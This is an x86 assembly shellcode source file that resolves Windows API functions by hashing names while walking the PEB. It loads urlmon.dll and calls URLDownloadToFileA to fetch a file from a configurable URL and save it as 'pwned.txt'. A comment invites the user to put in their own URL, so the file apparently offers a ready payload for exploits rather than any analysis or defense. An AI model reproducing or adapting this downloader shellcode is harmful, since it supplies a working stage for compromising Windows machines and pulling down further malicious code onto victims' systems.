; Shellcode to call URLDownloadToFileA
[BITS 32]
mainentrypoint:
mov esp,0x0018cdec
call geteip
geteip:
pop edx ; EDX is now base for function
lea edx, [edx-10] ;adjust for first instruction?
mov ebp, esp
sub esp, 1000h

; Find Kernel32 functions
push edx			; save current location
mov ebx, 0x4b1ffe8e ; kernel32.dll
call get_module_address
pop edx				; restore location
push ebp			; save base pointer
push edx			; save location
mov ebp, eax		; move address of kernel32 into ebp
lea esi, [EDX + KERNEL32HASHTABLE]		;load hash table into esi
lea edi, [EDX + KERNEL32FUNCTIONSTABLE]	;load function table into edi
call get_api_address	; edi has function addresses from kernel32
pop edx				; restore location
pop ebp				; restore base pointer

push ebp
push edx
;call LoadLibraryA('urlmon')
xor ecx, ecx		; ecx = 0
mov cx, 0x6e6f		; Move "on" in cx register, lower two bytes of ecx
push ecx		    ; Push null-terminated "on" to stack ("on" + \x0\x0)
push 0x6d6c7275		; Push "urlm", null terminated "urlmon" on stack
push esp		    ; lpLibFileName
mov eax, [EDX + LoadLibraryA] ; address of LoadLibraryA into eax
call eax
add esp,0x8			; clean up stack
pop edx
pop ebp

; Find urlmon functions
push edx ; save current location
mov ebx, 0x17008128 ; urlmon.dll hash
call get_module_address
pop edx ; restore current location
push ebp ; save stacker pointer
push edx ; save current location
mov ebp, eax ; move address of urlmon into ebp
lea esi, [EDX + URLMONHASHTABLE]        ; load hash table into esi
lea edi, [EDX + URLMONFUNCTIONSTABLE]   ; load function table into edi
call get_api_address					; after this function edi has function addresses from urlmon
pop edx   ; restore location
pop ebp   ; restore stack pionter

push ebp
push edx
; URLDownloadToFileA (LPUNKNOWN pCaller, LPCTSTR szURL, LPCTSTR szFileName, DWORD dwReserved, LPBINDSTATUSCALLBACK lpfnCB);
xor ecx, ecx		; ecx = 0 for later use
push ecx		    ; lpfnCB
push ecx			; dwReserved
lea esi, [edx+urldata]		; esi gets offset of URL	
lea edi, [edx+filename]			; edx gets script filename from command, downloaded file saved to this name
push edi			; szFileName
push esi			; szURL
push ecx			; pCaller
call eax




; EBP = Hash of desired module
get_module_address:
;walk PEB find target module
cld
xor edi, edi
mov edi, [FS:0x30]
mov edi, [edi+0xC]
mov edi, [edi+0x14]
next_module_loop:
mov esi, [edi+0x28]
xor edx, edx
module_hash_loop:
lodsw
test al, al
jz end_module_hash_loop
cmp al, 0x41
jb end_hash_check
cmp al, 0x5A
ja end_hash_check
or al, 0x20
end_hash_check:
rol edx, 7
xor dl, al
jmp module_hash_loop
end_module_hash_loop:

cmp edx, ebx
mov eax, [edi+0x10]
mov edi, [edi]
jnz next_module_loop

ret

get_api_address:
mov edx, ebp
add edx, [edx+3Ch]
mov edx, [edx+78h]
add edx, ebp
mov ebx, [edx+20h]
add ebx, ebp
xor ecx, ecx

load_api_hash:
push edi
push esi
mov esi, [esi]

load_api_name:
mov edi, [ebx]
add edi, ebp
push edx
xor edx, edx

create_hash_loop:
rol edx, 7
xor dl, [edi]
inc edi
cmp byte [edi], 0
jnz create_hash_loop

xchg eax, edx
pop edx
cmp eax, esi
jz load_api_addy
add ebx, 4
inc ecx
cmp [edx+18h], ecx
jnz load_api_name
pop esi
pop edi
ret

load_api_addy:
pop esi
pop edi
lodsd
push esi
push ebx
mov ebx, ebp
mov esi, ebx
add ebx, [edx+24h]
lea eax, [ebx+ecx*2]
movzx eax, word [eax]
lea eax, [esi+eax*4]
add eax, [edx+1ch]
mov eax, [eax]
add eax, esi
stosd
pop ebx
pop esi
add ebx, 4
inc ecx
cmp dword [esi], 0FFFFh
jnz load_api_hash

ret

KERNEL32HASHTABLE:
	dd 0xc8ac8026 ; LoadLibraryA
	dd 0xFFFF ; make sure to end with this token

KERNEL32FUNCTIONSTABLE:
LoadLibraryA:
	dd 0x00000001

URLMONHASHTABLE:
	dd 0xd95d2399 ;URLDownloadToFileA
	dd 0xFFFF ; make sure to end with this token

URLMONFUNCTIONSTABLE:
URLDownloadToFileA:
	dd 0x00000001
urldata:
; Change this to provide your own URL
; File extension in URL DOES matter 
; Extensions .txt and .htm (and possibly more) dont get saved to disk by URLDownloadToFile causing shellcode to fail

db "http://127.0.0.1/test1.tmp", 0
filename:
db "pwned.txt", 0